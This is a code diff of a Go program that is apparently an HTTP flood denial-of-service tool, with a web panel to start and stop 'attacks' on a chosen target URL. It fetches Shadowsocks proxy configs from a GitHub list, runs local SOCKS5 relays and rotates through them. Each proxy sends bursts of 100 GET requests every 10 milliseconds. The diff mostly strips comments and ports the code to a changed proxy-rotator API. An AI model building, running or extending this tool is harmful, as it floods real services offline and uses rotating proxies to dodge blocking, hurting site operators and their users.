@@ -20,27 +20,26 @@ import (
 
     "github.com/greysquirr3l/lashes"
     ss "github.com/shadowsocks/go-shadowsocks2/core"
-    "github.com/shadowsocks/go-shadowsocks2/socks"
 )
 
 // ========== CONFIGURATION ==========
 const (
     proxyListURL    = "https://raw.githubusercontent.com/render12345api/svr/main/ss_working.txt"
-    maxProxies      = 8                     // Number of concurrent Shadowsocks clients
-    reqsPerBurst    = 100                    // Requests per burst (per proxy)
+    maxProxies      = 8
+    reqsPerBurst    = 100
     burstInterval   = 10 * time.Millisecond
     refreshInterval = 15 * time.Minute
     maxErrorLog     = 20
-    localSocksPort  = 1080                    // Base port for local SOCKS servers
+    localSocksPort  = 1080
 )
 
-// Supported encryption methods (from go-shadowsocks2)
+// Supported encryption methods
 var supportedMethods = map[string]bool{
     "aes-128-cfb": true, "aes-192-cfb": true, "aes-256-cfb": true,
     "aes-128-ctr": true, "aes-192-ctr": true, "aes-256-ctr": true,
     "aes-128-gcm": true, "aes-192-gcm": true, "aes-256-gcm": true,
-    "chacha20-ietf-poly1305": true, "chacha20-poly1305": true,
-    "rc4-md5": true, "chacha20": true, "salsa20": true,
+    "chacha20-ietf-poly1305": true, "rc4-md5": true,
+    "chacha20": true, "salsa20": true,
 }
 
 // ========== DATA STRUCTURES ==========
@@ -52,8 +51,8 @@ type ProxyConfig struct {
 }
 
 type AttackStats struct {
-    requests uint64
-    errors   uint64
+    Requests uint64 `json:"requests"`
+    Errors   uint64 `json:"errors"`
 }
 
 type ErrorEntry struct {
@@ -79,11 +78,9 @@ var (
 
 // ========== PROXY PARSING ==========
 func decodeBase64Safe(s string) (string, error) {
-    // Add padding if needed
     if l := len(s) % 4; l > 0 {
         s += strings.Repeat("=", 4-l)
     }
-    // Replace URL-safe characters
     s = strings.ReplaceAll(s, "-", "+")
     s = strings.ReplaceAll(s, "_", "/")
     b, err := base64.StdEncoding.DecodeString(s)
@@ -98,18 +95,16 @@ func parseSSLine(line string) *ProxyConfig {
     if !strings.HasPrefix(line, "ss://") {
         return nil
     }
-    // Remove URL fragment (#...)
     if idx := strings.Index(line, "#"); idx != -1 {
         line = line[:idx]
     }
-    // Decode percent-encoding
     if decoded, err := url.QueryUnescape(line); err == nil {
         line = decoded
     }
 
-    raw := line[5:] // after "ss://"
+    raw := line[5:]
 
-    // Case 1: standard ss://base64(method:pass)@server:port
+    // Standard format: ss://base64(method:pass)@server:port
     if atIdx := strings.Index(raw, "@"); atIdx != -1 {
         encoded := raw[:atIdx]
         serverPort := raw[atIdx+1:]
@@ -130,15 +125,12 @@ func parseSSLine(line string) *ProxyConfig {
         }
     }
 
-    // Case 2: base64 JSON config (eyJ...)
-    // Try to extract base64 part (may be the whole raw)
+    // Base64 JSON config
     var b64 string
     if strings.ContainsAny(raw, "@:") {
-        // Not pure base64, maybe it's the standard format we already tried
         return nil
     }
     b64 = raw
-    // Remove any trailing ?params
     if qIdx := strings.Index(b64, "?"); qIdx != -1 {
         b64 = b64[:qIdx]
     }
@@ -186,13 +178,9 @@ func fetchProxyConfigs() ([]ProxyConfig, error) {
     var configs []ProxyConfig
     for _, line := range lines {
         cfg := parseSSLine(line)
-        if cfg != nil {
-            if supportedMethods[cfg.Method] {
-                configs = append(configs, *cfg)
-                log.Printf("✅ Valid: %s@%s:%s", cfg.Method, cfg.Server, cfg.Port)
-            } else {
-                log.Printf("⚠️ Unsupported method: %s", cfg.Method)
-            }
+        if cfg != nil && supportedMethods[cfg.Method] {
+            configs = append(configs, *cfg)
+            log.Printf("✅ Valid: %s@%s:%s", cfg.Method, cfg.Server, cfg.Port)
         }
     }
     log.Printf("Total valid configs: %d", len(configs))
@@ -201,16 +189,13 @@ func fetchProxyConfigs() ([]ProxyConfig, error) {
 
 // ========== SHADOWSOCKS LOCAL SERVERS ==========
 func startLocalSOCKS5(cfg ProxyConfig, localPort int) (func(), error) {
-    // Create Shadowsocks cipher
     cipher, err := ss.PickCipher(cfg.Method, nil, cfg.Password)
     if err != nil {
-        return nil, fmt.Errorf("cipher error: %v", err)
+        return nil, fmt.Errorf("cipher error: %w", err)
     }
 
-    // Remote address
     remoteAddr := net.JoinHostPort(cfg.Server, cfg.Port)
 
-    // Create a listener for SOCKS5
     ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
     if err != nil {
         return nil, err
@@ -243,7 +228,6 @@ func handleSOCKS5(client net.Conn, remoteAddr string, cipher ss.Cipher) {
         return
     }
     defer remote.Close()
-    // Relay traffic
     go func() {
         io.Copy(remote, client)
         if tcpConn, ok := remote.(*net.TCPConn); ok {
@@ -258,7 +242,6 @@ func handleSOCKS5(client net.Conn, remoteAddr string, cipher ss.Cipher) {
 
 // ========== PROXY ROTATOR SETUP ==========
 func setupRotator(ctx context.Context, configs []ProxyConfig) (*lashes.Rotator, error) {
-    // Start local SOCKS5 servers and collect proxy URLs
     var proxyURLs []string
     var closers []func()
 
@@ -280,7 +263,6 @@ func setupRotator(ctx context.Context, configs []ProxyConfig) (*lashes.Rotator, 
         return nil, fmt.Errorf("no proxies could be started")
     }
 
-    // Register cleanup on shutdown
     go func() {
         <-ctx.Done()
         for _, closer := range closers {
@@ -288,22 +270,21 @@ func setupRotator(ctx context.Context, configs []ProxyConfig) (*lashes.Rotator, 
         }
     }()
 
-    // Create rotator options
-    opts := lashes.DefaultOptions()
-    opts.Strategy = lashes.RoundRobinStrategy // Simple round-robin for now
-    opts.HealthCheck = &lashes.HealthCheckOptions{
+    // Create rotator with default config
+    config := lashes.DefaultConfig()
+    config.Strategy = lashes.RoundRobin
+    config.HealthCheck = &lashes.HealthCheckConfig{
         Interval: 30 * time.Second,
         Timeout:  5 * time.Second,
         Parallel: 3,
     }
-    opts.CircuitBreaker = lashes.DefaultCircuitBreakerConfig()
 
-    rot, err := lashes.New(opts)
+    rot, err := lashes.NewRotator(config)
     if err != nil {
         return nil, err
     }
 
-    // Add proxies to rotator
+    // Add proxies
     for _, p := range proxyURLs {
         if err := rot.AddProxy(ctx, p, lashes.SOCKS5); err != nil {
             log.Printf("Failed to add proxy %s: %v", p, err)
@@ -311,7 +292,7 @@ func setupRotator(ctx context.Context, configs []ProxyConfig) (*lashes.Rotator, 
     }
 
     // Start health checks
-    rot.StartHealthCheck(ctx, opts.HealthCheck)
+    rot.StartHealthChecks(ctx)
 
     return rot, nil
 }
@@ -325,14 +306,13 @@ func startAttack(target string, duration int) error {
     ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
     attackCancel = cancel
     attackActive = true
-    atomic.StoreUint64(&stats.requests, 0)
-    atomic.StoreUint64(&stats.errors, 0)
+    atomic.StoreUint64(&stats.Requests, 0)
+    atomic.StoreUint64(&stats.Errors, 0)
     errorLog = errorLog[:0]
 
     go func() {
         defer func() {
             attackActive = false
-            // Broadcast final stats
             broadcastStats()
         }()
 
@@ -344,7 +324,6 @@ func startAttack(target string, duration int) error {
             case <-ctx.Done():
                 return
             case <-ticker.C:
-                // Launch a burst of requests
                 var wg sync.WaitGroup
                 for i := 0; i < reqsPerBurst; i++ {
                     wg.Add(1)
@@ -353,25 +332,28 @@ func startAttack(target string, duration int) error {
                         if !attackActive {
                             return
                         }
-                        // Get a proxy client from rotator
-                        client, err := rotator.Client(ctx)
+                        proxy, err := rotator.Next(ctx)
                         if err != nil {
-                            atomic.AddUint64(&stats.errors, 1)
+                            atomic.AddUint64(&stats.Errors, 1)
                             logError(target, err.Error(), "rotator")
                             return
                         }
-                        // Make request
+                        client := &http.Client{
+                            Transport: &http.Transport{
+                                Proxy: http.ProxyURL(proxy.URL()),
+                            },
+                            Timeout: 10 * time.Second,
+                        }
                         req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
                         resp, err := client.Do(req)
                         if err != nil {
-                            atomic.AddUint64(&stats.errors, 1)
-                            logError(target, err.Error(), client.ProxyURL)
+                            atomic.AddUint64(&stats.Errors, 1)
+                            logError(target, err.Error(), proxy.URL().String())
                             return
                         }
-                        // Must read and close body to reuse connection
                         io.Copy(io.Discard, resp.Body)
                         resp.Body.Close()
-                        atomic.AddUint64(&stats.requests, 1)
+                        atomic.AddUint64(&stats.Requests, 1)
                     }()
                 }
                 wg.Wait()
@@ -379,7 +361,6 @@ func startAttack(target string, duration int) error {
         }
     }()
 
-    // Start stats ticker for UI updates
     statsTicker = time.NewTicker(1 * time.Second)
     go func() {
         for range statsTicker.C {
@@ -418,8 +399,8 @@ func logError(target, errMsg, proxy string) {
 
 func broadcastStats() {
     currentStats := AttackStats{
-        requests: atomic.LoadUint64(&stats.requests),
-        errors:   atomic.LoadUint64(&stats.errors),
+        Requests: atomic.LoadUint64(&stats.Requests),
+        Errors:   atomic.LoadUint64(&stats.Errors),
     }
     webClientsLock.Lock()
     defer webClientsLock.Unlock()
@@ -436,7 +417,6 @@ func main() {
     ctx, cancel := context.WithCancel(context.Background())
     defer cancel()
 
-    // Handle graceful shutdown
     sigChan := make(chan os.Signal, 1)
     signal.Notify(sigChan, os.Interrupt)
     go func() {
@@ -445,20 +425,17 @@ func main() {
         os.Exit(0)
     }()
 
-    // Fetch proxy configs
     var err error
     proxyConfigs, err = fetchProxyConfigs()
     if err != nil {
         log.Fatal("Failed to fetch proxies:", err)
     }
 
-    // Setup rotator
     rotator, err = setupRotator(ctx, proxyConfigs)
     if err != nil {
         log.Fatal("Failed to setup rotator:", err)
     }
 
-    // Background refresh every 15 minutes
     go func() {
         ticker := time.NewTicker(refreshInterval)
         defer ticker.Stop()
@@ -473,14 +450,11 @@ func main() {
                     log.Println("Refresh failed:", err)
                     continue
                 }
-                // Update configs (this would require recreating rotator, but for simplicity we skip)
-                // In production, you'd want to update the rotator with new proxies.
                 proxyConfigs = newConfigs
             }
         }
     }()
 
-    // Web server
     http.HandleFunc("/", indexHandler)
     http.HandleFunc("/start", startHandler)
     http.HandleFunc("/stop", stopHandler)
@@ -537,7 +511,6 @@ func statsHandler(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Cache-Control", "no-cache")
     w.Header().Set("Connection", "keep-alive")
 
-    // Create a channel for this client
     clientChan := make(chan AttackStats, 1)
     webClientsLock.Lock()
     webClients[clientChan] = true
@@ -550,17 +523,15 @@ func statsHandler(w http.ResponseWriter, r *http.Request) {
         close(clientChan)
     }()
 
-    // Send initial stats
     initialStats := AttackStats{
-        requests: atomic.LoadUint64(&stats.requests),
-        errors:   atomic.LoadUint64(&stats.errors),
+        Requests: atomic.LoadUint64(&stats.Requests),
+        Errors:   atomic.LoadUint64(&stats.Errors),
     }
     if err := json.NewEncoder(w).Encode(initialStats); err != nil {
         return
     }
     flusher.Flush()
 
-    // Listen for updates
     for {
         select {
         case <-r.Context().Done():
@@ -574,7 +545,6 @@ func statsHandler(w http.ResponseWriter, r *http.Request) {
     }
 }
 
-// HTML template (same as before, but simplified)
 const htmlTemplate = `<!DOCTYPE html>
 <html>
 <head>
@@ -648,6 +618,7 @@ const htmlTemplate = `<!DOCTYPE html>
                 const data = await res.json();
                 document.getElementById('reqCount').innerText = data.requests;
                 document.getElementById('errCount').innerText = data.errors;
+                document.getElementById('proxyCount').innerText = '8';
             } catch (err) {
                 console.error('Stats error:', err);
             }
@@ -695,5 +666,4 @@ const htmlTemplate = `<!DOCTYPE html>
         updateStatus();
     </script>
 </body>
-</html>
-`
+</html>`
